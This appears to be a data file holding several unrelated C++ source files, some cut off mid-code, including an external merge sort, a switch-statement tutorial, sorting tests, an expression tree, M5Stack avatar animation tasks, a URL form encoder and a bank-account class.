    "#include \"t1.h\"\r\n\r\nQVector<QString> T1::files;\r\n\r\nvoid splitFile(QString& filename, size_t numLines)\r\n{\r\n    QFile inf(filename);//\u5b9a\u4e49\u4e00\u4e2a\u5bf9\u8c61 inf\r\n    if (!inf.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n        qDebug() << \"Error: Unable to open file\" << filename;//qDebug\u5f53cout\u7528\r\n        return;\r\n    }\r\n\r\n    QTextStream infs(&inf);\r\n    infs.readLine();\r\n\r\n    size_t chunkFileindex = 1;\r\n\r\n    while (!infs.atEnd()) {\r\n        QString chunkFile = \"chunk\" + QString::number(chunkFileindex++) + \".txt\";\r\n        QFile ouf(chunkFile);\r\n        if (!ouf.open(QIODevice::WriteOnly | QIODevice::Text)) {\r\n            qDebug() << \"Error: Unable to create file\" << chunkFile;\r\n            return;\r\n        }\r\n        QTextStream oufs(&ouf);\r\n        QString line;\r\n        for (size_t i = 0; i < numLines && !infs.atEnd(); ++i) {\r\n            line = infs.readLine();\r\n            oufs << line << \"\\n\";\r\n        }\r\n        ouf.close();\r\n\r\n        T1::files.append(chunkFile);\r\n        qDebug() << \"Chunk\" << chunkFile << \"created.\";\r\n    }\r\n}\r\n//\u6587\u4ef6\u5206\u5757\r\nvoid sortFile()\r\n{\r\n\r\n    for (const auto& filePath : T1::files) {\r\n        QFile file(filePath);\r\n        if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {\r\n            qDebug() << \"Error: Unable to open file\" << filePath;\r\n            continue;\r\n        }\r\n\r\n        QTextStream in(&file);\r\n        QStringList lines;\r\n        while (!in.atEnd()) {\r\n            lines.append(in.readLine());\r\n        }\r\n        file.close();\r\n\r\n        std::sort(lines.begin(), lines.end());\r\n\r\n        if (!file.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {\r\n            qDebug() << \"Error: Unable to open file for writing\" << filePath;\r\n            continue;\r\n        }\r\n\r\n        QTextStream out(&file);\r\n        for (const auto& line : lines) {\r\n            out << line << '\\n';\r\n        }\r\n        file.close();\r\n        qDebug() << \"File: \" << filePath << \"sorted done.\";\r\n    }\r\n\r\n    qDebug() << \"All files sorted successfully.\";\r\n}\r\n\r\n\r\nvoid mergeFile() {\r\n\r\n    std::cout << \"File merge begin.......\" << '\\n';\r\n\r\n    std::priority_queue<std::pair<std::string, int>, std::vector<std::pair<std::string, int>>, std::greater<std::pair<std::string, int>>> pq;\r\n\r\n    std::vector<std::ifstream> chunkFilePointers;\r\n\r\n    for (const auto& chunkFile : T1::files) {\r\n        std::ifstream inputFile(chunkFile.toStdString());\r\n        if (!inputFile.is_open()) {\r\n            std::cerr << \"Error: Unable to open file \" << chunkFile.toStdString() << std::endl;\r\n            return;\r\n        }\r\n        chunkFilePointers.push_back(std::move(inputFile));\r\n    }\r\n\r\n\r\n    std::ofstream outputFile(\"output.txt\");\r\n    if (!outputFile.is_open()) {\r\n        std::cerr << \"Error: Unable to create output file.\" << std::endl;\r\n        return;\r\n    }\r\n\r\n\r\n    for (size_t i = 0; i < chunkFilePointers.size(); ++i) {\r\n        std::string line;\r\n        if (std::getline(chunkFilePointers[i], line)) {\r\n            pq.push({ line, i });\r\n        }\r\n    }\r\n\r\n\r\n    while (!pq.empty()) {\r\n        auto minPair = pq.top();\r\n        pq.pop();\r\n        outputFile << minPair.first << '\\n';\r\n\r\n        int chunkIndex = minPair.second;\r\n        std::string line;\r\n        if (std::getline(chunkFilePointers[chunkIndex], line)) {\r\n            pq.push({ line, chunkIndex });\r\n        }\r\n    }\r\n\r\n\r\n    outputFile.close();\r\n    for (auto& inputFile : chunkFilePointers) {\r\n        inputFile.close();\r\n    }\r\n\r\n    std::cout << \"Files merged successfully.\" << std::endl;\r\n}\r\n\r\nvoid deletetempFile()\r\n{\r\n    for (const QString &fileName : T1::files) {\r\n        if (QFile::exists(fileName)) {\r\n            if (QFile::remove(fileName)) {\r\n                qDebug() << \"Deleted file:\" << fileName;\r\n            } else {\r\n                qDebug() << \"Failed to delete file:\" << fileName;\r\n            }\r\n        } else {\r\n            qDebug() << \"File does not exist:\" << fileName;\r\n        }\r\n    }\r\n}\r\n",
    "/*\nSwitch Case Statements\n1) swtich cases and if else\n2) default case\n\n1) swtich cases and if else\nwhen we have a single variable to compare against multiple distinct values we use swtich case\nif-else: for handlinge statements with complex conditions\nswitch statements: simplifying cases with multiple exact matches (simple conditions which are dependent on a single variable)\n\n2) The switch case \nGeneric skeleton:\nswitch (expression)\n{\n    case constant-expression:\n        (case1 body);\n        break;\n    .\n    .\n    .\n    default:\n        (default case body);\n}\nDefault case: none of the cases match the expression, the code inside the default block will execute (safety net)\nRequirement for a Constant Expression: expression results in a constant value (can include constants & arithmetic expressions)\nLimited to Integer or Character Types: designed to handle integer or character values\nSignificance of the 'Break' Keyword: It serves as an exit mechanism from the switch statement.\nOptional Default Case: default case is optional\nProhibition of Duplicate Case Values: duplicates of case values are disallowed within a switch\nPotential for Nested Switch Statements: possible to nest one switch statement inside another in C++, but its not suggested as it increases complexities in reading the code\n*/\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n    int d = 0;\n    cout<<\"Enter day no.(1-7): \";\n    cin>>d;\n    switch (d)\n    {\n    case 1://using constant int\n        cout<<\"Sunday\"<<endl;\n        break;\n    case 2:\n        cout<<\"Monday\"<<endl;\n        break;\n    case 3:\n        cout<<\"Tuesday\"<<endl;\n        break;\n    case 4:\n        cout<<\"Wednesday\"<<endl;\n        break;\n    case 5:\n        cout<<\"Thursday\"<<endl;\n        break;\n    case 6:\n        cout<<\"Friday\"<<endl;\n        break;\n    case 7:\n        cout<<\"Saturday\"<<endl;\n        break;\n    default:\n        cout<<\"Invalid Input\"<<endl;\n        break;// not necessary to add break to default case!\n    }\n\n    const int x = 10;\n    const int y = 20;\n    switch (x+y)//expression results in a constant value\n    {\n        case 10:\n            cout<<\"Result is 10\"<<endl;\n            break;\n        case 30:\n            cout<<\"Result is 30\"<<endl;\n            break;\n        default:\n            cout<<\"No match found\"<<endl;\n    }\n\n    char g = 'A';\n    switch(g)//designed to handle integer or character values\n    {\n        case 'A':\n            cout<<\"Excellent\"<<endl;\n            break;\n        case 'B':\n            cout<<\"Very Good\"<<endl;\n            break;\n        default:\n            cout<<\"Invalid grade\"<<endl;\n    }\n\n    //nested switch cases\n    int a = 2;\n    int b = 3;\n    switch(a)\n    {\n        case 1:\n            cout<<\"a is 1\"<<endl;\n            switch(b)\n            {\n                case 1:\n                    cout<<\"b is 1\"<<endl;\n                    break;\n                case 2:\n                    cout<<\"b is 2\"<<endl;\n                    break;\n                case 3:\n                    cout<<\"b is 3\"<<endl;\n                    break;\n                default:\n                    cout<<\"b is not 1\"<<endl;\n            }\n            break;\n\n        case 2:\n            cout<<\"a is 2\"<<endl;\n            switch(b)\n            {\n                case 1:\n                    cout<<\"b is 1\"<<endl;\n                    break;\n                case 2:\n                    cout<<\"b is 2\"<<endl;\n                    break;\n                case 3:\n                    cout<<\"b is 3\"<<endl;\n                    break;\n                default:\n                    cout<<\"b is not 1\"<<endl;\n            }\n            break;\n\n        default:\n            cout<<\"Invalid values of a and b\";\n    }\n    return 0;\n}",
    "#include <iostream>\n\n#include \"func_for_tests.cpp\"\nusing namespace std;\n\nvoid swap(int* a, int* b) {\n  int tmp = *a;\n  *a = *b;\n  *b = tmp;\n}\n\nvoid selection_sort(int* arr, int arrSize) {\n  int indexOfMin = 0;\n  for (int i = 0; i < arrSize - 1; i++) {\n    indexOfMin = i;\n    for (int j = i + 1; j < arrSize; j++) {\n      if (arr[j] < arr[indexOfMin]) {\n        indexOfMin = j;\n      }\n    }\n    swap(&arr[i], &arr[indexOfMin]);\n  }\n}\n\nint main() {\n  // Test 1 (sorted array)\n  int arr1[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};\n  print_test(arr1, 10, selection_sort);\n\n  // Test 2 (reverse array)\n  int arr2[] = {9, 8, 7, 6, 5, 4, 3, 2, 1};\n  print_test(arr2, 10, selection_sort);\n\n  // Test 3 (random array)\n  int arr3[100] = {};\n  fill_array_with_random_int(arr3, 100);\n  print_test(arr3, 100, selection_sort);\n\n  // // Test 4 (huge random array)\n  int arr4[100000] = {};\n  fill_array_with_random_int(arr4, 100000);\n  print_test(arr4, 100000, selection_sort);\n\n  // // Test 5 (many arrays with different length)\n  print_huge_test(selection_sort);\n\n  return 0;\n}\n",
    "/*Construct an expression tree from the given prefix expression eg. +--a*bc/def and\r\ntraverse it using post order traversal (non recursive) and then delete the entire tree. */\r\n\r\n#include<stdio.h> \r\n#include<iostream> \r\n#include<stack> \r\nusing namespace std; \r\nclass Tree  \r\n{ \r\ntypedef struct node \r\n{ \r\nchar data[10]; \r\nstruct node *left,*right; \r\n}btree; \r\npublic: \r\nbtree *root,*New; \r\nTree(); \r\nvoid create(); \r\nvoid insert(btree *root, btree *New);  void display(); \r\nvoid recursive();\r\nvoid deleteTree(btree *root);\r\nvoid rec_postorder(btree *root); \r\n void nonrecursive(); \r\n void nonrec_postorder(btree *root); }; \r\nTree::Tree() \r\n{ \r\nroot=NULL; \r\n}\r\nvoid Tree::recursive() \r\n{ \r\n rec_postorder(root); \r\n} \r\nvoid Tree::rec_postorder(btree *root)  { \r\n if(root!=NULL) \r\n { \r\nrec_postorder(root->left); \r\nrec_postorder(root->right); \r\ncout<<\"\\t\"<<root->data; \r\n }\r\n } \r\nvoid Tree::nonrecursive() \r\n { \r\n nonrec_postorder(root); \r\n } \r\nvoid Tree::nonrec_postorder(btree *root) { \r\n if(!root) \r\n { \r\n cout<<\"\\n Tree empty\";  return;  } \r\n stack<btree *> s; \r\n stack<btree *> op; \r\n s.push(root); \r\n while(!s.empty()) \r\n { \r\n btree *curr=s.top();  op.push(curr);  s.pop(); \r\n if(curr->left)\r\n s.push(curr->left);  if(curr->right) \r\n s.push(curr->right);  } \r\n while(!op.empty()) \r\n { \r\n cout<<op.top()->data<<\"\\t\";  op.pop(); \r\n } \r\n} \r\nvoid Tree::create() \r\n{ \r\nNew=new btree; \r\ncout<<\"\\n Enter the data which you want :- \"; cin>>New->data; \r\nNew->left = NULL; \r\nNew->right= NULL; \r\nif(root==NULL) \r\n{ \r\nroot=New; \r\n} \r\nelse \r\n{ \r\ninsert(root,New); \r\n} \r\n} \r\nvoid Tree::insert(btree *root,btree *New) \r\n{ \r\nchar ans;\r\ncout<<\"\\n\\n You wnat to insert \"<<New->data<<\" at left or  right child of \"<<root->data<<\" : \"; \r\ncin>>ans; \r\nif(ans=='l'|| ans=='L') \r\n{ \r\nif(root->left==NULL) \r\n{ \r\nroot->left=New; \r\n} \r\nelse \r\n{ \r\ninsert(root->left,New); \r\n} \r\n} \r\nelse \r\n{ \r\nif(root->right==NULL) \r\n{ \r\nroot->right=New; \r\n} \r\nelse \r\n{ \r\ninsert(root->right,New); \r\n} \r\n} \r\n} \r\nvoid Tree::deleteTree(btree *root) {\r\n    if (root != NULL) \r\n    {\r\n        \r\n        deleteTree(root->left);\r\n        deleteTree(root->right);\r\n        cout<<root->data<<\"\\n \";\r\n        delete root;\r\n        root = NULL;\r\n    }\r\n}\r\n\r\n  \r\n  \r\nint main() \r\n{ \r\nTree tr; \r\nint ch; \r\nchar ans;\r\ndo \r\n{ \r\ncout<<\"\\n\\tExpression Tree \"; \r\ncout<<\"\\n\\t1. Create\\n\\t2. Display\\n\\t3. Delete\\n\\t4. Exit\\n\\t..... Enter Your Choice: \"; \r\ncin>>ch; \r\nswitch(ch) \r\n{ \r\ncase 1: \r\ndo \r\n{ \r\ntr.create(); \r\ncout<<\"\\n\\t Do You Want to Insert More Elements: \"; \r\ncin>>ans; \r\n}while(ans=='y'||ans=='Y'); \r\nbreak; \r\ncase 2: \r\ncout<<\"\\n\\t\\t*****Display \\n\\t\\t1.Recursive\\n\\t\\t2. Non Recursive\"; \r\ncout<<\"\\n\\t\\t....Enter Your Choice: \"; \r\ncin>>ch;\r\nif(tr.root!=NULL)\r\n{ \r\nswitch(ch) \r\n{ \r\ncase 1: cout<<\"\\n\\tRecursive Postorder Traversal\\n\"; \r\ntr.recursive(); \r\nbreak; \r\ncase 2: cout<<\"\\n\\tNon Recursive Postorder Traversal\\n\"; \r\ntr.nonrecursive(); \r\nbreak; \r\n}\r\n}\r\nelse\r\n{\r\ncout<<\"\\n Tree is Empty\";\r\n} \r\nbreak;\r\ncase 3:\r\ntr.deleteTree(tr.root);\r\ntr.root=NULL;\r\ncout<<\"DELETED\\n\";\r\nbreak;\r\n\r\ncase 4: \r\n cout<<\"That's All\"; \r\nreturn (0); \r\n} \r\ncout<<\"\\n\\t..... Do You Want to Continue: \"; \r\ncin>>ans; \r\n}while(ans=='y'||ans=='Y'); \r\ncout<<\"Thats all!\"; \r\nreturn(0); \r\n}\r\n",
    "// Copyright (c) Shinya Ishikawa. All rights reserved.\n// Licensed under the MIT license. See LICENSE file in the project root for full\n// license information.\n\n#include \"Avatar.h\"\nnamespace m5avatar {\nconst uint32_t DEFAULT_STACK_SIZE = 2048;\n\nunsigned int seed = 0;\n\n// TODO(meganetaaan): make read-only\nDriveContext::DriveContext(Avatar *avatar) : avatar{avatar} {}\n\nAvatar *DriveContext::getAvatar() { return avatar; }\n\nTaskHandle_t drawTaskHandle;\n\nvoid updateBreath(void *args) {\n  int c = 0;\n  DriveContext *ctx = reinterpret_cast<DriveContext *>(args);\n  Avatar *avatar = ctx->getAvatar();\n  while (avatar->isDrawing()) {\n    c = c + 1 % 100;\n    float f = sin(c * 2 * PI / 100.0);\n    avatar->setBreath(f);\n    vTaskDelay(33);\n  }\n  vTaskDelete(NULL);\n}\n\nvoid drawLoop(void *args) {\n  DriveContext *ctx = reinterpret_cast<DriveContext *>(args);\n  Avatar *avatar = ctx->getAvatar();\n  while (avatar->isDrawing()) {\n    if (avatar->isDrawing()) {\n      avatar->draw();\n    }\n    vTaskDelay(10);\n  }\n  vTaskDelete(NULL);\n}\n\nvoid saccade(void *args) {\n  DriveContext *ctx = reinterpret_cast<DriveContext *>(args);\n  Avatar *avatar = ctx->getAvatar();\n  while (avatar->isDrawing()) {\n    float vertical = rand_r(&seed) / (RAND_MAX / 2.0) - 1;\n    float horizontal = rand_r(&seed) / (RAND_MAX / 2.0) - 1;\n    avatar->setGaze(vertical, horizontal);\n    vTaskDelay(500 + 100 * random(20));\n  }\n  vTaskDelete(NULL);\n}\n\nvoid blink(void *args) {\n  DriveContext *ctx = reinterpret_cast<DriveContext *>(args);\n  Avatar *avatar = ctx->getAvatar();\n  while (avatar->isDrawing()) {\n    avatar->setEyeOpenRatio(1);\n    vTaskDelay(2500 + 100 * random(20));\n    avatar->setEyeOpenRatio(0);\n    vTaskDelay(300 + 10 * random(20));\n  }\n  vTaskDelete(NULL);\n}\n\nAvatar::Avatar() : Avatar(new Face()) {}\n\nAvatar::Avatar(Face *face)\n    : face{face},\n      _isDrawing{false},\n      expression{Expression::Neutral},\n      breath{0},\n      eyeOpenRatio{1},\n      mouthOpenRatio{0},\n      gazeV{0},\n      gazeH{0},\n      rotation{0},\n      scale{1},\n      palette{ColorPalette()},\n      speechText{\"\"},\n      colorDepth{1},\n      batteryIconStatus{BatteryIconStatus::invisible}{}\n\nvoid Avatar::setFace(Face *face) { this->face = face; }\n\nFace *Avatar::getFace() const { return face; }\n\nvoid Avatar::addTask(TaskFunction_t f, const char* name) {\n  DriveContext *ctx = new DriveContext(this);\n  // TODO(meganetaaan): set a task handler\n#if false //2024.06.16 openweather\u5229\u7528\u306e\u305f\u3081\u306b\u30b9\u30bf\u30c3\u30af\u30b5\u30a4\u30ba\u3092\u5927\u304d\u304f\u3057\u3066\u307f\u308b\u3002\u5143\u306b\u623b\u3059\u306b\u306f\u3001\u3053\u3053\u3092true\u306b\u3059\u308b\u3002\n  xTaskCreate(f, /* Function to implement the task */\n                          name, /* Name of the task */\n                          DEFAULT_STACK_SIZE, /* Stack size in words */\n                          ctx,                /* Task input parameter */\n                          1,                  /* P2014riority of the task */\n                          NULL);              /* Task handle. */\n#else\n   xTaskCreatePinnedToCore(f, /* Function to implement the task */\n                           name, /* Name of the task */\n                           8192, /* Stack size in words */\n                           ctx,                /* Task input parameter */\n                           1,                  /* P2014riority of the task */\n                           NULL,               /* Task handle. */\n                           ARDUINO_RUNNING_CORE); /* Core where the task should run */\n#endif\n}\n\nvoid Avatar::init(int colorDepth) {\n  // for compatibility with older version\n  start(colorDepth);\n}\n\nvoid Avatar::stop() { _isDrawing = false; }\n\nvoid Avatar::suspend() {\n  vTaskSuspend(drawTaskHandle);\n}\n\nvoid Avatar::resume() {\n  vTaskResume(drawTaskHandle);\n}\n\nvoid Avatar::start(int colorDepth) { \n  // if the task already started, don't create another task;\n  if (_isDrawing) return;\n  _isDrawing = true;\n\n  this->colorDepth = colorDepth;\n  DriveContext *ctx = new DriveContext(this);\n  // TODO(meganetaaan): keep handle of these tasks\n  xTaskCreate(drawLoop,     /* Function to implement the task */\n                          \"drawLoop\",   /* Name of the task */\n                          2048,         /* Stack size in words */\n                          ctx,          /* Task input parameter */\n                          1,            /* Priority of the task */\n                          &drawTaskHandle);        /* Task handle. */\n  xTaskCreate(saccade,      /* Function to implement the task */\n                          \"saccade\",    /* Name of the task */\n                          1024,         /* Stack size in words */\n                          ctx,          /* Task input parameter */\n                          2,            /* Priority of the task */\n                          NULL);        /* Task handle. */\n  xTaskCreate(updateBreath, /* Function to implement the task */\n                          \"breath\",     /* Name of the task */\n                          1024,         /* Stack size in words */\n                          ctx,          /* Task input parameter */\n                        ",
    "//#include <iostream>\n//#include <string>\n//#include<Windows.h> // to have better control of the console window for eg to change color or move to a location on the console window\n//#include<conio.h> // to take key input like arrow keys\n//#include<sstream> // for string to number conversion\n//#include <fstream>\n//#include<vector>\n//#include <iomanip>\n//using namespace std;\n//// Global variables\n//string fileName;\n//// structures\n//struct Expense {\n//\tstring user;\n//\tstring category;\n//\tstring description;\n//\tdouble amount;\n//\tstring date;\n//\tstring designation; // where you are spending it on!\n//};\n//struct FamilyMember {\n//\tstring user;\n//\tstring name;\n//\tExpense famExpenses[100];\n//\tvector<Expense> expenses; // A vector of Expense structures\n//};\n//struct users {\n//\tstring username;\n//\tstring password;\n//\tint familymembers;\n//\tdouble income;\n//\tstring currency;\n//\tvector<Expense> expenses; // A vector of Expense structures\n//\tvector<FamilyMember> familyMembers; // A vector of FamilyMember structures\n//}userInfo;\n//\n//struct Data {\n//\tdouble amount;\n//\tstring category;\n//\tstring description;\n//\tstring date;\n//\tstring designation;\n//};\n//\n//vector<Data>user;\n//string months[12] = { \"Jan\", \"Feb\", \"Mar\", \"Apr\",\n//\t\t\t\t\t\"May\", \"June\", \"July\", \"Aug\",\n//\t\t\t\t\t\"Sept\", \"Oct\", \"Nov\", \"Dec\" };\n//string username, filename;\n//string password;\n////Savings & Debt\n//double saving, debt;\n//double salary;\n//void usersaving();\n//void userdebt();\n//// Function Declarations \n//// Utility Functions\n//void color(int color);\n//void gotoxy(int x, int y);\n//bool checkUsername(const string& username);\n//bool startsWithLetters(const string& str);\n//// function to add expenses\n//void addExpense(string category, string fileName);\n//// function to update,delete expenses\n//void updateExpense(string category, string fileName);\n//void deleteExpense(const string& category, const string& fileName);\n////function to search \n//void searchExpense(string fileName);\n//vector<Expense> readExpensesFromFile(string fileName);\n//void viewCategoryExpense(string category, string fileName);\n//void viewExpenses();\n//// Welcome Screen\n//int welcome(); // initial screen that user will see once the program starts\n//// All menus\n//bool menu1(int choose); // Login or Signup\n//void menu2();\t\t\t// display Categories and Add/view expenses\n//void menu3(string action);\n//bool registerUser(); // Sign UP \n//bool loginUser(); // Login \n//bool forgetUser();\n//void genReport();\n//void readMonth(string filename, string dated);\n//void readWeek(string filename, string dated);\n//void readYear(string filename, string dated);\n//void tokenize(string s, string del);\n//bool isInt(const string& str);\n//void splitDate(const string& date, int& year, int& month, int& day);\n//void splitDate(const string& date, int& year, int& month);\n//int getWeekOfMonth(int day);\n//\n//\n//void main()\n//{\n//\tint action;\n//\tint log = welcome(); // user selects an option i.e Login / signup\n//\tif (menu1(log)) {\n//\t\tint Set[9] = { 7,7,7,7,7,7,7,7,7 };\n//\t\tint counter = 1;\n//\t\tchar key;\n//\n//\t\tbool exit = false;\n//\t\tdo\n//\t\t{\n//\t\t\tsystem(\"cls\");\n//\t\t\tcout << \"\\t\\tPersonal Expense Tracker\\t\\n\\n\";\n//\t\t\tfor (int i = 0;;) {\n//\n//\t\t\t\tgotoxy(10, 4);\n//\t\t\t\tcolor(Set[0]);\n//\t\t\t\tcout << \"1. Add Expense\";\n//\n//\n//\t\t\t\tgotoxy(35, 4);\n//\t\t\t\tcolor(Set[1]);\n//\t\t\t\tcout << \"\\t 2. View Expense \\n\\t\";\n//\n//\t\t\t\tgotoxy(10, 6);\n//\t\t\t\tcolor(Set[2]);\n//\t\t\t\tcout << \"3. Update Expense \";\n//\n//\t\t\t\tgotoxy(35, 6);\n//\t\t\t\tcolor(Set[3]);\n//\t\t\t\tcout << \"\\t 4. Delete Expense \\n\\t\";\n//\n//\t\t\t\tgotoxy(10, 8);\n//\t\t\t\tcolor(Set[4]);\n//\t\t\t\tcout << \"5. Generate Monthly Report\\n\\t\";\n//\n//\t\t\t\tgotoxy(35, 8);\n//\t\t\t\tcolor(Set[5]);\n//\t\t\t\tcout << \"\\t 6. View Savings\\n\\t\";\n//\n//\t\t\t\tgotoxy(10, 10);\n//\t\t\t\tcolor(Set[6]);\n//\t\t\t\tcout << \"7. View Debts\\n\\t\";\n//\n//\t\t\t\tgotoxy(35, 10);\n//\t\t\t\tcolor(Set[7]);\n//\t\t\t\tcout << \"\\t 8.Search Expense\\n\";\n//\n//\t\t\t\tgotoxy(10, 12);\n//\t\t\t\tcolor(Set[8]);\n//\t\t\t\tcout << \"9. Exit\\n\";\n//\n//\t\t\t\tkey = _getch();\n//\n//\t\t\t\tif (key == 75 && (counter == 2 || counter == 4 || counter == 6 || counter == 8)) { // Left arrow key\n//\t\t\t\t\tcounter--;\n//\t\t\t\t}\n//\t\t\t\tif (key == 77 && (counter == 1 || counter == 3 || counter == 5 || counter == 7)) { // Right arrow key\n//\t\t\t\t\tcounter++;\n//\t\t\t\t}\n//\t\t\t\tif (key == 72 && (counter > 2)) { // Up arrow key\n//\t\t\t\t\tcounter -= 2;\n//\t\t\t\t}\n//\t\t\t\tif (key == 80 && (counter < 8)) { // Down arrow key\n//\t\t\t\t\tcounter += 2;\n//\t\t\t\t}\n//\t\t\t\tif (key == '\\r') { // '\\z' carriage return OR Enter key\n//\t\t\t\t\taction = counter;\n//\t\t\t\t\tcolor(7);\n//\t\t\t\t\tbreak;\n//\t\t\t\t}\n//\t\t\t\t// by default color white\n//\t\t\t\tfor (int i = 0; i < 9; i++) {\n//\t\t\t\t\tSet[i] = 7;\n//\t\t\t\t}\n//\t\t\t\t// Set current selection to red\n//\t\t\t\tif (counter >= 1 && counter <= 9) {\n//\t\t\t\t\tSet[counter - 1] = 12; // Red color\n//\t\t\t\t}\n//\t\t\t}\n//\t\t\tswitch (action)\n//\t\t\t{\n//\t\t\tcase 1:\n//\t\t\t{\n//\t\t\t\tmenu2();\n//\t\t\t\tbreak; // user gets choices to choose from to add expenses\n//\t\t\t}\n//\t\t\tcase 2:\n//\t\t\t{\n//\t\t\t\tviewExpenses();\n//\t\t\t\tbreak;\n//\t\t\t}\n//\t\t\tcase 3:\n//\t\t\t{\n//\t\t\t\tmenu3(\"update\");\n//\n//\t\t\t",
    "#include \"WwwFormEncodedDict.h\"\n#include \"StringUtils.h\"\n\n#include <sstream>\n\n#include <stdio.h>\n#include <ctype.h>\n\nusing namespace std;\n\nWwwFormEncodedDict::WwwFormEncodedDict() {\n  // nothing needed\n}\n\nWwwFormEncodedDict::WwwFormEncodedDict(string body) {\n  //parse the body\n  vector<string> pairs = StringUtils::split(body, '&');\n  vector<string>::iterator iter;\n  for (iter = pairs.begin(); iter != pairs.end(); iter++) {\n    vector<string> keyValue = StringUtils::split(*iter, '=');\n    if (keyValue.size() != 2) {\n      throw \"Parse error\";\n    }\n\n    string key = urldecode(keyValue[0]);\n    string value = urldecode(keyValue[1]);\n    m_values[key] = value;\n  }\n}\n\nstring WwwFormEncodedDict::get(string key) {\n  return m_values[key];\n}\n\nvoid WwwFormEncodedDict::set(string key, string value) {\n  m_values[key] = value;\n}\n\nvoid WwwFormEncodedDict::set(string key, int value) {\n  stringstream stream;\n  stream << value;\n  m_values[key] = stream.str();\n}\n\nstring WwwFormEncodedDict::encode() {\n  stringstream output;\n  map<string, string>::iterator iterator;\n  for (iterator = m_values.begin(); iterator != m_values.end(); iterator++) {\n    if (iterator != m_values.begin()) {\n      output << \"&\";\n    }\n    output << urlencode(iterator->first) << \"=\" << urlencode(iterator->second);\n  }\n\n  return output.str();\n}\n\nstring WwwFormEncodedDict::urlencode(std::string str) {\n  string::iterator iterator;\n  stringstream encoded;\n  for (iterator = str.begin(); iterator != str.end(); iterator++) {\n    char c = *iterator;\n    if (isalnum(c)) {\n      encoded << c;\n    } else {\n      char hex[5];\n      snprintf(hex, sizeof(hex), \"%%%02x\", c);\n      encoded << hex;\n    }\n  }\n\n  return encoded.str();\n}\n\nstring WwwFormEncodedDict::urldecode(std::string str) {\n  vector<string> lines = StringUtils::splitWithDelimiter(str, '%');\n  bool nextStartsWithHex = false;\n  stringstream decoded;\n  \n  vector<string>::iterator iter;\n  for (iter = lines.begin(); iter != lines.end(); iter++) {\n    string line = *iter;\n    if (line == \"%\") {\n      nextStartsWithHex = true;\n    } else if (nextStartsWithHex) {\n      string hex = line.substr(0, 2);\n      unsigned int digit;\n      int ret = sscanf(hex.c_str(), \"%02x\", &digit);\n      if (ret != 1) {\n\tthrow \"couldn't parse escaped char\";\n      }\n      decoded << (char) digit;\n      decoded << line.substr(2);\n      nextStartsWithHex = false;\n    } else {\n      decoded << line;\n    }\n  }\n\n  return decoded.str();\n}\n",
    "/****************************************************************************\n Copyright (c) 2017-2018 Xiamen Yaji Software Co., Ltd.\n Copyright (c) 2019-present Axmol Engine contributors (see AUTHORS.md).\n\n https://axmolengine.github.io/\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the \"Software\"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in\n all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n THE SOFTWARE.\n ****************************************************************************/\n\n#include \"main.h\"\n#include \"AppDelegate.h\"\n#include \"axmol.h\"\n\n// Uncomment to enable win32 console\n#define USE_WIN32_CONSOLE\n\nUSING_NS_AX;\n\nint axmol_main() {\n    // create the application instance\n    AppDelegate app;\n    int ret = Application::getInstance()->run();\n    return ret;\n}\n\n#if !defined(_CONSOLE)\nint WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)\n{\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    // create the application instance\n#ifdef USE_WIN32_CONSOLE\n#    include \"platform/win32/EmbedConsole.h\"\n#endif\n\n    // create the application instance\n    return axmol_main();\n}\n#else\nint main(int, char**) {\n    return axmol_main();\n}\n#endif\n",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nconst int MAX_ACCOUNTS = 100;\r\n\r\nclass Account{\r\n\tprotected:\r\n\t\tstatic int accountCounter;\r\n\t\tint accountNumber;\r\n\t\tstring owner;\r\n\t\tdouble balance;\r\n\tpublic:\r\n\t    Account(const string &owner,double initialBalance)\r\n\t\t: owner(owner), balance(initialBalance) {\r\n\t\t\taccountNumber = ++accountCounter;\r\n\t\t}\t\r\n\t\tvirtual ~Account(){}\r\n\t\t\r\n\t\tint getAccountNumber() const{\r\n\t\t\treturn accountNumber;\r\n\t\t}\r\n\t\t\r\n\t\tdouble getBalance() const{\r\n\t\t\treturn balance;\r\n\t\t}\r\n\t\tconst string &getowner() const{\r\n\t\t\treturn owner;\r\n\t\t}\r\n\t\t\r\n\t\tvirtual void deposit(double amount) {\r\n\t\t\tbalance +=amount;\r\n\t\t}\r\n\t\t\r\n\t\tvirtual void withdraw(double amount){\r\n\t\t\tif (amount<= balance) {\r\n\t\t\t\r\n\t\t\tbalance -= amount;\r\n\t\t} else {\r\n\t\t\tcout<<\"Insufficient Balance!\" <<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tvirtual void display() const {\r\n\t\t\tcout<<\"Account Number is: \"<< accountNumber<<endl;\r\n\t\t\tcout<<\"Owner Name is: \"<< owner<<endl;;\r\n\t\t\tcout<<\"Your Balance is: Rs. \"<< balance<<endl;\r\n\t\t}\r\n\r\n\t    static int getAccountCounter(){\r\n\t    \treturn accountCounter;\r\n\t\t}\r\n};\r\n\r\nint Account::accountCounter = 0;\r\nclass SavingsAccount : public Account {\r\n       public:\r\n\t   SavingsAccount(const string &owner,double initialBalance)\t\r\n\t   : Account(owner,initialBalance) {}\t  \r\n\t   \r\n\t   